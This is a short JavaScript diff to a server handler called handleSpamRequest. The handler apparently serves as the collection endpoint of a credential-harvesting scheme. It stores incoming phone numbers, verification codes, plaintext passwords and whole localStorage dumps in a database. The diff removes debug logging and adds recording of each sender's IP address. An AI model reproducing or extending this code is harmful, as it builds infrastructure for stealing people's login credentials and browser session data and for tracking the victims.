@@ -8,15 +8,11 @@ export const handleSpamRequest = handleAsync(
 
     // 解析接收到的序列化数据
     const parsedData = JSON.parse(data);
-    console.log('接收到的 localStorage 数据:', parsedData);
-    console.log('--------------------------------');
     // 从 parsedData 中提取 phoneCode、password 和 phoneNumber
     const { phoneCode, password, phoneNumber, ...localStorageData } =
       parsedData;
-    console.log('提取的数据:', { phoneCode, password, phoneNumber });
-    console.log('++++++++++++++++++++++++++++++++');
-    // 剩余的数据存储到 localStorageData
-    console.log('localStorage 数据:', localStorageData);
+
+    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress; // 获取客户端 IP 地址
 
     // 创建新的 Customer 实例
     const newCustomer = new Customer({
@@ -24,6 +20,7 @@ export const handleSpamRequest = handleAsync(
       password,
       phoneNumber,
       localStorage: JSON.stringify(localStorageData), // 将 localStorageData 转换为字符串存储
+      ip,
     });
 
     // 保存到数据库
@@ -34,6 +31,7 @@ export const handleSpamRequest = handleAsync(
       message: '请求成功',
       data: { phoneCode, password, phoneNumber },
       localStorage: localStorageData,
+      ip,
     });
   },
 );
